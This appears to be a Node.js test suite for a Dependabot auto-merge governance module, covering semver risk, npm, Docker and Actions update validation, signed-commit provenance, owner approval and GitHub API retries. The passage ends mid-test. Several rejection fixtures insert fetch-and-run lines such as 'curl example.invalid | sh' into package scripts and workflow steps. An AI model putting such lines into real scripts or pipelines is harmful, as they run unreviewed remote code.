/* global structuredClone */
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  classifyEcosystem,
  compareSemver,
  ensureOwnerReviewAndApproval,
  GitHubApi,
  eventPullNumber,
  parseDependabotMetadata,
  parsePositiveInteger,
  projectSignedDockerDelta,
  parseSemverLike,
  reconcileIndependently,
  reconcileWithBaseConvergence,
  requestDependabotRefresh,
  resolveConcurrentMerge,
  isExactConcurrentMergeConflict,
  selectQualificationRun,
  validateActionsSemanticChange,
  validateConfig,
  validateDockerSemanticChange,
  validateNpmSemanticChange,
  validateProvenance,
  validateSignedMetadata,
  workflowIdentityMatches,
} from './dependency-governance.mjs';

const config = JSON.parse(readFileSync('.github/dependency-governance.json', 'utf8'));

const meta = (name, updateType = 'version-update:semver-patch') => [{ name, version: '1.2.4', dependencyType: 'direct:production', updateType }];

test('semver parser rejects prereleases and classifies risk conservatively', () => {
  assert.deepEqual(parseSemverLike('^1.2.3'), { major: 1, minor: 2, patch: 3, raw: '^1.2.3' });
  assert.equal(parseSemverLike('1.2.3-beta.1'), null);
  assert.equal(compareSemver('1.2.3', '1.2.4').risk, 'patch');
  assert.equal(compareSemver('1.2.3', '1.3.0').risk, 'minor');
  assert.equal(compareSemver('1.2.3', '2.0.0').risk, 'major');
  assert.equal(compareSemver('0.2.3', '0.3.0').risk, 'major-risk');
  assert.equal(compareSemver('1.2.3', '1.2.2').risk, 'downgrade');
});

test('verified Dependabot metadata parser extracts structured update records', () => {
  const message = `deps(deps): update thing\n\n---\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 5.2.2\n  dependency-type: direct:production\n  update-type: version-update:semver-patch\n- dependency-name: jest\n  dependency-version: 30.5.0\n  dependency-type: direct:development\n  update-type: version-update:semver-minor\n...\n`;
  assert.deepEqual(parseDependabotMetadata(message), [
    { name: 'express', version: '5.2.2', dependencyType: 'direct:production', updateType: 'version-update:semver-patch' },
    { name: 'jest', version: '30.5.0', dependencyType: 'direct:development', updateType: 'version-update:semver-minor' },
  ]);
});

test('file scope maps to exactly one ecosystem', () => {
  assert.equal(classifyEcosystem([{ filename: 'package.json' }, { filename: 'package-lock.json' }], config), 'npm');
  assert.equal(classifyEcosystem([{ filename: '.github/workflows/docs.yml' }], config), 'github-actions');
  assert.equal(classifyEcosystem([{ filename: 'package.json' }, { filename: 'README.md' }], config), 'unknown');
});

function npmFixture(from = '^1.2.3', to = '^1.2.4') {
  const basePackage = { name: 'x', version: '1.0.0', scripts: { test: 'node --test' }, dependencies: { express: from } };
  const headPackage = structuredClone(basePackage);
  headPackage.dependencies = { express: to };
  const baseLock = { name: 'x', version: '1.0.0', lockfileVersion: 3, packages: { '': { name: 'x', version: '1.0.0', dependencies: { express: from } }, 'node_modules/express': { version: from.replace('^', ''), integrity: 'sha512-old' } } };
  const headLock = { name: 'x', version: '1.0.0', lockfileVersion: 3, packages: { '': { name: 'x', version: '1.0.0', dependencies: { express: to } }, 'node_modules/express': { version: to.replace('^', ''), integrity: 'sha512-new' } } };
  return { basePackage, headPackage, baseLock, headLock };
}

test('npm patch dependency-only update is eligible', () => {
  const f = npmFixture();
  const result = validateNpmSemanticChange(f.basePackage, f.headPackage, f.baseLock, f.headLock, meta('express'));
  assert.equal(result.eligible, true, result.reasons.join('; '));
  assert.equal(result.changes[0].risk, 'patch');
});

test('Dependabot generated lock root can omit trusted override mirror but not replace security pin', () => {
  const f = npmFixture();
  f.basePackage.overrides = { 'proxy-addr': '2.0.8' };
  f.headPackage.overrides = structuredClone(f.basePackage.overrides);
  f.baseLock.packages[''].overrides = structuredClone(f.basePackage.overrides);
  const okay = validateNpmSemanticChange(
    f.basePackage, f.headPackage, f.baseLock, f.headLock, meta('express'),
  );
  assert.equal(okay.eligible, true, okay.reasons.join('; '));

  f.headLock.packages[''].overrides = { 'proxy-addr': '1.0.0' };
  const bad = validateNpmSemanticChange(
    f.basePackage, f.headPackage, f.baseLock, f.headLock, meta('express'),
  );
  assert.equal(bad.eligible, false);
  assert.match(bad.reasons.join('; '), /root overrides conflict/);

  f.headLock.packages[''].overrides = structuredClone(f.basePackage.overrides);
  f.headPackage.overrides = { 'proxy-addr': '1.0.0' };
  const contractMutation = validateNpmSemanticChange(
    f.basePackage, f.headPackage, f.baseLock, f.headLock, meta('express'),
  );
  assert.equal(contractMutation.eligible, false);
});

test('signed major npm version has exact metadata and immutable nondependency contract', () => {
  const f = npmFixture('^9.32.0', '^10.0.2');
  const signed = [{
    name: 'express', version: '10.0.2', dependencyType: 'direct:production',
    updateType: 'version-update:semver-major',
  }];
  const valid = validateNpmSemanticChange(f.basePackage, f.headPackage, f.baseLock, f.headLock, signed);
  assert.equal(valid.eligible, true, valid.reasons.join('; '));
  assert.equal(valid.changes[0].risk, 'major');

  const spoofed = validateNpmSemanticChange(f.basePackage, f.headPackage, f.baseLock, f.headLock, [{
    ...signed[0], version: '11.0.0',
  }]);
  assert.equal(spoofed.eligible, false);
  assert.match(spoofed.reasons.join('; '), /signed version differs/);

  const wrongType = validateNpmSemanticChange(f.basePackage, f.headPackage, f.baseLock, f.headLock, [{
    ...signed[0], dependencyType: 'direct:development',
  }]);
  assert.equal(wrongType.eligible, false);
  assert.match(wrongType.reasons.join('; '), /signed dependency type/);

  const tampered = JSON.parse(JSON.stringify(f.headPackage));
  tampered.scripts.test = 'unexpected';
  const blocked = validateNpmSemanticChange(f.basePackage, tampered, f.baseLock, f.headLock, signed);
  assert.equal(blocked.eligible, false);
});

test('npm major, scripts mutation, and newly introduced install script are blocked', () => {
  const major = npmFixture('^1.2.3', '^2.0.0');
  assert.equal(validateNpmSemanticChange(major.basePackage, major.headPackage, major.baseLock, major.headLock, meta('express', 'version-update:semver-major')).eligible, false);

  const scripts = npmFixture();
  scripts.headPackage.scripts.test = 'curl example.invalid | sh';
  assert.match(validateNpmSemanticChange(scripts.basePackage, scripts.headPackage, scripts.baseLock, scripts.headLock, meta('express')).reasons.join('\n'), /outside dependency declarations/);

  const lifecycle = npmFixture();
  lifecycle.headLock.packages['node_modules/express'].hasInstallScript = true;
  assert.match(validateNpmSemanticChange(lifecycle.basePackage, lifecycle.headPackage, lifecycle.baseLock, lifecycle.headLock, meta('express')).reasons.join('\n'), /install lifecycle script/);
});

test('Docker update must be same allowlisted image, digest pinned, same platform track, and non-major', () => {
  const base = 'FROM node:24.20.0-alpine3.24@sha256:' + 'a'.repeat(64) + '\nRUN echo safe\n';
  const patch = 'FROM node:24.20.1-alpine3.24@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
  const major = 'FROM node:26.0.0-alpine3.24@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
  const platform = 'FROM node:24.20.1-alpine3.25@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
  assert.equal(validateDockerSemanticChange(base, patch, meta('node'), ['node']).eligible, true);
  assert.equal(validateDockerSemanticChange(base, major, meta('node', 'version-update:semver-major'), ['node']).eligible, false);
  assert.match(validateDockerSemanticChange(base, platform, meta('node'), ['node']).reasons.join('\n'), /platform suffix changed/);
  assert.match(validateDockerSemanticChange(base, patch.replace('RUN echo safe', 'RUN curl bad'), meta('node'), ['node']).reasons.join('\n'), /outside a FROM line/);
});


test('signed Docker image delta projects onto unrelated current-main changes without untrusted edits', () => {
  const oldImage = 'FROM node:24.22.2-trixie-slim@sha256:' + 'a'.repeat(64);
  const newImage = 'FROM node:24.22.3-trixie-slim@sha256:' + 'b'.repeat(64);
  const old = [oldImage, '', 'ARG DEBIAN_PIN=old', ''].join('\n');
  const signedHead = old.replace(oldImage, newImage);
  const advancedMain = old.replace('ARG DEBIAN_PIN=old', 'ARG DEBIAN_PIN=reviewed');
  const request = {
    sourceBaseText: old,
    signedHeadText: signedHead,
    currentMainText: advancedMain,
    signedMetadata: [{ name: 'node', version: '24.22.3-trixie-slim', updateType: 'version-update:semver-patch' }],
    allowedImages: config.ecosystems.docker.allowedImages,
  };
  const outcome = projectSignedDockerDelta(request);
  assert.equal(outcome.state, 'projected');
  assert.equal(outcome.index, 0);
  assert.equal(outcome.content, advancedMain.replace(oldImage, newImage));
  assert.match(outcome.content, /DEBIAN_PIN=reviewed/);
  assert.equal(outcome.changes[0].risk, 'patch');

  // The same signed update must not create a second branch after accepted main advances.
  const already = projectSignedDockerDelta({ ...request, currentMainText: outcome.content });
  assert.equal(already.state, 'already-accepted');
  assert.equal(already.content, outcome.content);

  const conflict = advancedMain.replace(oldImage, oldImage.replace('24.22.2', '24.22.4'));
  assert.throws(
    () => projectSignedDockerDelta({ ...request, currentMainText: conflict }),
    /conflicts/,
  );
  assert.throws(
    () => projectSignedDockerDelta({
      ...request,
      currentMainText: advancedMain.replace('ARG DEBIAN_PIN=reviewed', 'ARG EXTRA=1\nARG DEBIAN_PIN=reviewed'),
    }),
    /line structure/,
  );
  assert.throws(
    () => projectSignedDockerDelta({
      ...request,
      signedMetadata: [{ name: 'node', version: '24.22.3', updateType: 'version-update:semver-patch' }],
    }),
    /must exactly match/,
  );
  assert.throws(
    () => projectSignedDockerDelta({
      ...request,
      signedMetadata: [...request.signedMetadata, ...request.signedMetadata],
    }),
    /must exactly match/,
  );
  // Any signed commit that also changes a non-FROM line is not an eligible bot source.
  assert.throws(
    () => projectSignedDockerDelta({
      ...request,
      signedHeadText: signedHead.replace('ARG DEBIAN_PIN=old', 'ARG DEBIAN_PIN=malicious'),
    }),
    /ineligible/,
  );
  assert.throws(
    () => projectSignedDockerDelta({ ...request, signedMetadata: meta('unrelated') }),
    /ineligible/,
  );
  const invalidFrom = signedHead.replace(newImage, 'FROM node-this-image-has-no-tag');
  const invalidDirect = validateDockerSemanticChange(
    old, invalidFrom, request.signedMetadata, request.allowedImages,
  );
  assert.equal(invalidDirect.eligible, false);
  assert.match(invalidDirect.reasons.join('; '), /unparseable Docker FROM image/);
  assert.throws(
    () => projectSignedDockerDelta({ ...request, signedHeadText: invalidFrom }),
    /ineligible/,
  );

  assert.throws(
    () => projectSignedDockerDelta({ ...request, signedHeadText: signedHead.replace('sha256:' + 'b'.repeat(64), 'sha256:invalid') }),
    /ineligible/,
  );
  assert.throws(
    () => projectSignedDockerDelta({ ...request, currentMainText: advancedMain.replace(/\n/g, '\r\n') }),
    /exact UTF-8 LF/,
  );
  const secondOld = 'FROM node:22.22.2-trixie-slim@sha256:' + 'c'.repeat(64);
  const secondNew = 'FROM node:22.22.3-trixie-slim@sha256:' + 'd'.repeat(64);
  assert.throws(
    () => projectSignedDockerDelta({
      ...request,
      sourceBaseText: old + secondOld + '\n',
      signedHeadText: signedHead + secondNew + '\n',
      currentMainText: advancedMain + secondOld + '\n',
    }),
    /exactly one signed image-line/,
  );
});

test('Actions updates require SHA pins and only uses-line changes, including protected workflows', () => {
  const file = '.github/workflows/docs.yml';
  const base = `steps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v7.0.0\n`;
  const patch = `steps:\n  - uses: actions/checkout@${'b'.repeat(40)} # v7.0.1\n`;
  const major = `steps:\n  - uses: actions/checkout@${'b'.repeat(40)} # v8.0.0\n`;
  const coarseBase = `steps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v7\n`;
  const coarsePatch = `steps:\n  - uses: actions/checkout@${'b'.repeat(40)} # v7\n`;
  assert.equal(validateActionsSemanticChange([{ filename: file }], { [file]: base }, { [file]: patch }, meta('actions/checkout'), config.manualReviewPaths).eligible, true);
  assert.equal(validateActionsSemanticChange([{ filename: file }], { [file]: coarseBase }, { [file]: coarsePatch }, meta('actions/checkout'), config.manualReviewPaths).eligible, true);
  assert.equal(validateActionsSemanticChange([{ filename: file }], { [file]: base }, { [file]: major }, meta('actions/checkout', 'version-update:semver-major'), config.manualReviewPaths).eligible, false);
  const security = '.github/workflows/security.yml';
  const protectedPin = validateActionsSemanticChange(
    [{ filename: security }],
    { [security]: base },
    { [security]: patch },
    meta('actions/checkout'),
    config.manualReviewPaths,
  );
  assert.equal(protectedPin.eligible, true, protectedPin.reasons.join('; '));
  const structural = patch + '  - run: curl example.invalid | sh\n';
  const protectedMutation = validateActionsSemanticChange(
    [{ filename: security }],
    { [security]: base },
    { [security]: structural },
    meta('actions/checkout'),
    config.manualReviewPaths,
  );
  assert.equal(protectedMutation.eligible, false);
  assert.match(protectedMutation.reasons.join('\n'), /line structure|pinned-action pattern/);
});

test('governance config only accepts signed semantic update classes and protects control-plane workflows', () => {
  assert.deepEqual(validateConfig(config), []);
  assert.ok(validateConfig({ ...config, allowedUpdateTypes: [...config.allowedUpdateTypes, 'version-update:semver-prerelease'] }).length > 0);
  assert.ok(validateConfig({ ...config, manualReviewPaths: [] }).length > 0);
  for (const invalid of [undefined, null, false, '30', 0, 29, 1441, 2.5]) {
    assert.ok(validateConfig({ ...config, nativeRefreshEscalationMinutes: invalid }).length > 0);
  }
});

function canonicalFixture() {
  const baseSha = 'a'.repeat(40);
  const headSha = 'b'.repeat(40);
  const pull = {
    number: 41,
    user: { login: config.botLogin, id: config.botUserId },
    base: { ref: config.baseBranch, repo: { full_name: 'o/r' } },
    head: { ref: 'dependabot/npm_and_yarn/routine', repo: { full_name: 'o/r' }, sha: headSha },
    draft: false,
    labels: [],
    created_at: '2026-09-01T12:00:00Z',
    commits: 1,
  };
  const commit = {
    sha: headSha,
    author: { login: config.botLogin, id: config.botUserId },
    committer: { login: config.trustedCommitterLogin },
    commit: {
      author: { name: config.botLogin, email: config.botAuthorEmail },
      committer: { name: config.gitCommitterName, email: config.gitCommitterEmail },
      verification: { verified: true, reason: 'valid', signature: 'fixture-signature' },
      message: `x\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 5.2.2\n  dependency-type: direct:production\n  update-type: version-update:semver-patch\n...\n\n${config.signedOffBy}`,
    },
    parents: [{ sha: baseSha }],
  };
  return { baseSha, headSha, pull, commit };
}

test('provenance requires canonical GitHub-signed Dependabot identity and a fresh single commit', () => {
  const fixture = canonicalFixture();
  const now = new Date('2026-09-02T12:00:00Z');
  assert.equal(validateProvenance({ pull: fixture.pull, commits: [fixture.commit], baseSha: fixture.baseSha, config, now }).eligible, true);

  const labeled = structuredClone(fixture.pull);
  labeled.labels = [{ name: 'manual-review' }];
  assert.equal(validateProvenance({ pull: labeled, commits: [fixture.commit], baseSha: fixture.baseSha, config, now }).eligible, false);
  assert.equal(validateProvenance({ pull: fixture.pull, commits: [fixture.commit], baseSha: 'c'.repeat(40), config, now }).eligible, false);
  const old = structuredClone(fixture.pull);
  old.created_at = '2026-08-01T12:00:00Z';
  assert.equal(validateProvenance({ pull: old, commits: [fixture.commit], baseSha: fixture.baseSha, config, now }).eligible, false);
});

test('provenance refuses spoofed bot identity, non-GitHub committer, invalid signature, and missing signoff', () => {
  const fixture = canonicalFixture();
  const bad = structuredClone(fixture.commit);
  bad.author.id = 123;
  bad.commit.author.email = 'dependabot[bot]@example.invalid';
  bad.committer.login = 'someone';
  bad.commit.verification.reason = 'unknown_key';
  bad.commit.message = bad.commit.message.replace(config.signedOffBy, '');
  const result = validateProvenance({ pull: fixture.pull, commits: [bad], baseSha: fixture.baseSha, config, now: new Date('2026-09-02T12:00:00Z') });
  assert.equal(result.eligible, false);
  assert.match(result.reasons.join('\n'), /numeric identity|author email|materialized|signature|Signed-off-by/);
});

test('signed metadata recognizes major but rejects unknown update classes', () => {
  const patchCommit = { commit: { message: `x\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 5.2.2\n  dependency-type: direct:production\n  update-type: version-update:semver-patch\n...\n` } };
  const majorCommit = { commit: { message: `x\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 6.0.0\n  dependency-type: direct:production\n  update-type: version-update:semver-major\n...\n` } };
  assert.equal(validateSignedMetadata(patchCommit, config).eligible, true);
  assert.equal(validateSignedMetadata(majorCommit, config).eligible, true);
  majorCommit.commit.message = majorCommit.commit.message.replace('version-update:semver-major', 'version-update:unknown');
  assert.equal(validateSignedMetadata(majorCommit, config).eligible, false);
});


test('qualification proof binds exact workflow identity and tolerates unavailable empty PR association metadata', () => {
  const fixture = canonicalFixture();
  const requirement = config.requiredWorkflows[0];
  const run = {
    id: 10,
    name: requirement.workflow,
    path: `.github/workflows/${requirement.file}`,
    event: 'pull_request',
    head_sha: fixture.headSha,
    head_branch: fixture.pull.head.ref,
    pull_requests: [],
    updated_at: '2026-09-02T10:00:00Z',
  };
  assert.equal(workflowIdentityMatches(run, fixture.pull, requirement), true);
  assert.equal(workflowIdentityMatches({ ...run, pull_requests: [{ number: fixture.pull.number }] }, fixture.pull, requirement), true);
  for (const mutation of [
    { path: '.github/workflows/fake.yml' },
    { name: 'fake' },
    { event: 'push' },
    { head_sha: 'c'.repeat(40) },
    { head_branch: 'dependabot/npm_and_yarn/other' },
    { pull_requests: [{ number: 999 }] },
  ]) assert.equal(workflowIdentityMatches({ ...run, ...mutation }, fixture.pull, requirement), false);
  const newerWrongPath = { ...run, id: 11, path: '.github/workflows/fake.yml', updated_at: '2026-09-02T11:00:00Z' };
  assert.equal(selectQualificationRun([newerWrongPath, run], fixture.pull, requirement).id, 10);
});

function ownerApiFixture({ validIdentity = true } = {}) {
  const comments = [];
  const reviews = [];
  const posts = [];
  const owner = {
    login: validIdentity ? config.ownerApprovalLogin : 'not-owner',
    id: validIdentity ? config.ownerApprovalUserId : 999,
  };
  return {
    comments,
    reviews,
    posts,
    api: {
      async get(path) {
        if (path === 'https://api.github.com/user') return owner;
        throw new Error(`unexpected GET ${path}`);
      },
      async paginate(path) {
        if (/\/issues\/\d+\/comments$/u.test(path)) return comments;
        if (/\/pulls\/\d+\/reviews$/u.test(path)) return reviews;
        throw new Error(`unexpected paginate ${path}`);
      },
      async post(path, body) {
        posts.push({ path, body });
        if (/\/issues\/\d+\/comments$/u.test(path)) {
          comments.push({ body: body.body, user: owner });
          return comments.at(-1);
        }
        if (/\/pulls\/\d+\/reviews$/u.test(path)) {
          reviews.push({
            state: body.event === 'APPROVE' ? 'APPROVED' : body.event,
            commit_id: body.commit_id,
            user: owner,
            body: body.body,
          });
          return reviews.at(-1);
        }
        throw new Error(`unexpected POST ${path}`);
      },
    },
  };
}

test('stale Dependabot refresh is owner-authenticated, exact-subject bound, and idempotent', async () => {
  const fixture = canonicalFixture();
  const assessment = {
    pull: fixture.pull,
    baseSha: 'c'.repeat(40),
    provenance: { eligible: false, reasons: ['PR is not rebased directly on the current base branch head'] },
  };
  const owner = ownerApiFixture();
  assert.equal(await requestDependabotRefresh(owner.api, assessment, config), true);
  assert.equal(owner.posts.length, 1);
  assert.match(owner.posts[0].body.body, /^@dependabot rebase/mu);
  assert.match(owner.posts[0].body.body, new RegExp(fixture.headSha));
  assert.match(owner.posts[0].body.body, new RegExp(assessment.baseSha));
  assert.equal(await requestDependabotRefresh(owner.api, assessment, config), true);
  assert.equal(owner.posts.length, 1, 'same exact stale subject must not post duplicate refresh commands');

  const impostor = ownerApiFixture({ validIdentity: false });
  await assert.rejects(
    () => requestDependabotRefresh(impostor.api, assessment, config),
    /configured repository owner identity/,
  );
});

test('stalled signed Dependabot refresh escalates once after configured lease; rejects invalid timing and spoofed owner', async () => {
  const fixture = canonicalFixture();
  const start = new Date('2026-11-17T00:00:00Z');
  const assessment = {
    pull: fixture.pull,
    baseSha: 'c'.repeat(40),
    provenance: { eligible: false, reasons: ['PR is not rebased directly on the current base branch head'] },
  };
  const owner = ownerApiFixture();
  assert.equal(await requestDependabotRefresh(owner.api, assessment, config, { observedAt: start }), true);
  assert.match(owner.posts[0].body.body, /^@dependabot rebase\n/mu);
  owner.comments[0].created_at = start.toISOString();
  const justBefore = new Date(start.getTime() + config.nativeRefreshEscalationMinutes * 60_000 - 1);
  assert.equal(await requestDependabotRefresh(owner.api, assessment, config, { observedAt: justBefore }), true);
  assert.equal(owner.posts.length, 1);
  const expired = new Date(start.getTime() + config.nativeRefreshEscalationMinutes * 60_000);
  assert.equal(await requestDependabotRefresh(owner.api, assessment, config, { observedAt: expired }), true);
  assert.equal(owner.posts.length, 2);
  assert.match(owner.posts[1].body.body, /^@dependabot recreate\n/mu);
  assert.match(owner.posts[1].body.body, new RegExp(fixture.headSha));
  assert.match(owner.posts[1].body.body, new RegExp(assessment.baseSha));
  await requestDependabotRefresh(owner.api, assessment, config, { observedAt: new Date(expired.getTime() + 86_400_000) });
  assert.equal(owner.posts.length, 2, 'same signed head must never receive duplicate recreate');
  const newHead = { ...assessment, pull: { ...assessment.pull, head: { ...assessment.pull.head, sha: 'd'.repeat(40) } } };
  await requestDependabotRefresh(owner.api, newHead, config, { observedAt: expired });
  assert.equal(owner.posts.length, 3, 'new exact bot head gets a fresh native rebase');
  assert.match(owner.posts[2].body.body, /^@dependabot rebase\n/mu);

  for (const invalid of ['unverified', '2100-01-01T00:00:00Z']) {
    const held = ownerApiFixture();
    await requestDependabotRefresh(held.api, assessment, config, { observedAt: start });
    held.comments[0].created_at = invalid;
    await requestDependabotRefresh(held.api, assessment, config, { observedAt: expired });
    assert.equal(held.posts.length, 1, 'unknown/future rebase time must not authorize recreate');
  }
  const attacker = ownerApiFixture();
  attacker.comments.push({ body: owner.posts[0].body.body, created_at: start.toISOString(), user: { login: 'impostor', id: 1 } });
  await requestDependabotRefresh(attacker.api, assessment, config, { observedAt: expired });
  assert.equal(attacker.posts.length, 1, 'spoofed rebase does not authorize recreate');
  assert.match(attacker.posts[0].body.body, /^@dependabot rebase\n/mu);
  await assert.rejects(
    () => requestDependabotRefresh(owner.api, assessment, config, { observedAt: new Date('invalid') }),
    /observation clock/,
  );
  const unsafe = { ...assessment, provenance: { eligible: false, reasons: ['PR is not rebased directly on the current base branch head', 'invalid signed source'] } };
  assert.equal(await requestDependabotRefresh(owner.api, unsafe, config, { observedAt: expired }), false);
});

test('owner review and approval bind the exact qualified head', async () => {
  const fixture = canonicalFixture();
  const assessment = { pull: fixture.pull };
  const owner = ownerApiFixture();
  await ensureOwnerReviewAndApproval(owner.api, assessment, config);
  assert.equal(owner.comments.length, 1);
  assert.equal(owner.reviews.length, 1);
  assert.equal(owner.reviews[0].state, 'APPROVED');
  assert.equal(owner.reviews[0].commit_id, fixture.headSha);
  assert.match(owner.comments[0].body, new RegExp(fixture.headSha));
  assert.match(owner.reviews[0].body, new RegExp(fixture.headSha));

  await ensureOwnerReviewAndApproval(owner.api, assessment, config);
  assert.equal(owner.comments.length, 1, 'owner review comment must be idempotent per exact head');
  assert.equal(owner.reviews.length, 1, 'owner approval must be idempotent per exact head');
});

test('manual dispatch PR input accepts only positive safe integers', () => {
  assert.equal(parsePositiveInteger('41'), 41);
  assert.equal(eventPullNumber({ inputs: { 'pr-number': '41' } }, 'workflow_dispatch'), 41);
  for (const value of ['0', '-1', '1.5', 'abc', '9007199254740992']) assert.throws(() => parsePositiveInteger(value, 'pr-number'));
});

test('scheduled reconciliation isolates per-PR failures and reports all outcomes', async () => {
  const pulls = [{ number: 1 }, { number: 2 }, { number: 3 }];
  const visited = [];
  const result = await reconcileIndependently(pulls, async (pull) => {
    visited.push(pull.number);
    if (pull.number === 2) throw new Error('boom');
    return `ok-${pull.number}`;
  });
  assert.deepEqual(visited, [1, 2, 3]);
  assert.deepEqual(result.results.map((item) => item.number), [1, 3]);
  assert.deepEqual(result.failures, [{ number: 2, error: 'boom' }]);
});

test('bulk reconciliation restarts from a fresh open-PR snapshot after any merge advances main', async () => {
  let open = [{ number: 1 }, { number: 2 }];
  const visits = [];
  const result = await reconcileWithBaseConvergence(
    async () => open.map((pull) => ({ ...pull })),
    async (pull) => {
      visits.push(pull.number);
      if (pull.number === 2) {
        open = open.filter((item) => item.number !== 2);
        return { merged: true };
      }
      return { merged: false };
    },
  );

  assert.deepEqual(
    visits,
    [1, 2, 1],
    'PR 1 must be reassessed after PR 2 advances the base branch',
  );
  assert.equal(result.passes, 2);
  assert.equal(result.failures.length, 0);
  assert.deepEqual(
    result.results.map((item) => [item.number, item.pass, item.result.merged]),
    [
      [1, 1, false],
      [2, 1, true],
      [1, 2, false],
    ],
  );
});

test('base-convergence reconciliation remains bounded and validates its pass ceiling', async () => {
  let nextNumber = 0;
  await assert.rejects(
    () =>
      reconcileWithBaseConvergence(
        async () => [{ number: ++nextNumber }],
        async () => ({ merged: true }),
        { maxPasses: 2 },
      ),
    /convergence exceeded 2 pass/,
  );
  await assert.rejects(
    () => reconcileWithBaseConvergence(async () => [], async () => ({}), { maxPasses: 0 }),
    /maxPasses/,
  );
});

test('privileged workflow never checks out the dependency PR head', () => {
  const workflow = readFileSync('.github/workflows/dependency-governance.yml', 'utf8');
  assert.match(workflow, /pull_request_target:/);
  assert.match(workflow, /workflow_run:/);
  assert.match(workflow, /schedule:/);
  assert.match(workflow, /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/);
  assert.match(workflow, /persist-credentials: false/);
  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.pull_request\.head/);
  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha/);
});

function mockGithubApiFetch(statuses) {
  const originalFetch = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (url, options) => {
    calls.push({ url, method: options.method, headers: options.headers });
    const status = statuses[calls.length - 1];
    assert.ok(status, 'unexpected extra GitHub request');
    return {
      status,
      ok: status >= 200 && status < 300,
      text: async () => JSON.stringify(status === 200 ? { authenticated: true } : { message: `fixture HTTP ${status}` }),
    };
  };
  return {
    calls,
    restore() { globalThis.fetch = originalFetch; },
  };
}

function testApi() {
  return new GitHubApi({
    token: 'fixture-owner-token',
    repository: 'portyu9/qa-automation-node-supertest',
    maxPaginationPages: 2,
  });
}

test('authenticated GET retries only transient GitHub server responses', async () => {
  for (const status of [500, 502, 503, 504]) {
    const mock = mockGithubApiFetch([status, 200]);
    try {
      assert.deepEqual(await testApi().get('https://api.github.com/user'), { authenticated: true });
      assert.equal(mock.calls.length, 2);
      assert.deepEqual(mock.calls.map((call) => call.method), ['GET', 'GET']);
      assert.ok(mock.calls.every((call) => call.url === 'https://api.github.com/user'));
      assert.ok(mock.calls.every((call) => call.headers.Authorization === 'Bearer fixture-owner-token'));
    } finally {
      mock.restore();
    }
  }
});

test('exhausted transient GET responses fail closed at exactly three attempts', async () => {
  const mock = mockGithubApiFetch([500, 500, 500]);
  try {
    await assert.rejects(testApi().get('/pulls/17'), /GET .*\/pulls\/17 failed \(500\)/);
    assert.equal(mock.calls.length, 3);
  } finally {
    mock.restore();
  }
});

test('unauthorized, policy and rate-limit GET failures never retry', async () => {
  for (const status of [400, 401, 403, 404, 409, 422, 429]) {
    const mock = mockGithubApiFetch([status]);
    try {
      await assert.rejects(testApi().get('/pulls/17'), (error) => error.message.includes(`failed (${status})`));
      assert.equal(mock.calls.length, 1);
    } finally {
      mock.restore();
    }
  }
});

test('mutation failures never retry even with transient HTTP 500', async () => {
  for (const method of ['POST', 'PATCH', 'PUT']) {
    const mock = mockGithubApiFetch([500]);
    try {
      await assert.rejects(testApi().request(method, 'https://api.github.com/user', { event: 'APPROVE' }), /failed \(500\)/);
      assert.equal(mock.calls.length, 1, `${method} must never be replayed`);
      assert.equal(mock.calls[0].method, method);
    } finally {
      mock.restore();
    }
  }
});

test('405 merge already in progress is narrowly recognized without replaying PUT', async () => {
  const api = testApi();
  const path = `${api.root}/pulls/88/merge`;
  assert.equal(
    isExactConcurrentMergeConflict(
      new Error(`GitHub API PUT ${path} failed (405): Merge already in progress`),
      api,
      88,
    ),
    true,
  );
  for (const error of [
    `GitHub API PUT ${path} failed (405): Method not allowed`,
    `GitHub API PUT ${path} failed (403): Merge already in progress`,
    `GitHub API POST ${path} failed (405): Merge already in progress`,
    `GitHub API PUT ${api.root}/pulls/89/merge failed (405): Merge already in progress`,
  ]) {
    assert.equal(isExactConcurrentMergeConflict(new Error(error), api, 88), false);
  }
});

test('concurrent merge resolver accepts only exact head and verified merge commit', async () => {
  const head = 'a'.repeat(40);
  const merge = 'b'.repeat(40);
  const requests = [];
  const waits = [];
  const api = {
    async get(path) {
      requests.push(path);
      if (requests.length === 1) {
        return { number: 88, head: { sha: head }, state: 'open', merged: false };
      }
      return {
        number: 88,
        head: { sha: head },
        state: 'closed',
        merged: true,
        merge_commit_sha: merge,
      };
    },
  };
  const result = await resolveConcurrentMerge(api, 88, head, {
    pause: async (ms) => waits.push(ms),
  });
  assert.deepEqual(result, { merged: true, sha: merge });
  assert.deepEqual(requests, ['/pulls/88', '/pulls/88']);
  assert.deepEqual(waits, [250]);
});

test('concurrent merge resolver defers boundedly if GitHub is still merging', async () => {
  const head = 'a'.repeat(40);
  let reads = 0;
  const waits = [];
  const api = {
    async get(path) {
      assert.equal(path, '/pulls/88');
      reads += 1;
      return { number: 88, head: { sha: head }, state: 'open', merged: false };
    },
  };
  const result = await resolveConcurrentMerge(api, 88, head, {
    pause: async (ms) => waits.push(ms),
  });
  assert.deepEqual(result, { merged: false, deferred: true });
  assert.equal(reads, 3);
  assert.deepEqual(waits, [250, 500]);
});

test('concurrent merge resolver fails closed on changed head and ambiguous terminal state', async () => {
  const head = 'a'.repeat(40);
  for (const live of [
    {
      number: 88,
      head: { sha: 'b'.repeat(40) },
      state: 'closed',
      merged: true,
      merge_commit_sha: 'c'.repeat(40),
    },
    { number: 88, head: { sha: head }, state: 'closed', merged: false },
    { number: 88, head: { sha: head }, state: 'closed', merged: true },
    {
      number: 89,
      head: { sha: head },
      state: 'closed',
      merged: true,
      merge_commit_sha: 'c'.repeat(40),
    },
  ]) {
    const api = { get: async () => live };
    await assert.rejects(
      resolveConcurrentMerge(api, 88, head, {
        pause: async () => {
          throw new Error('must not wait');
        },
      }),
      /concurrent merge resolution/,
    );
  }
  const api = { get: async () => null };
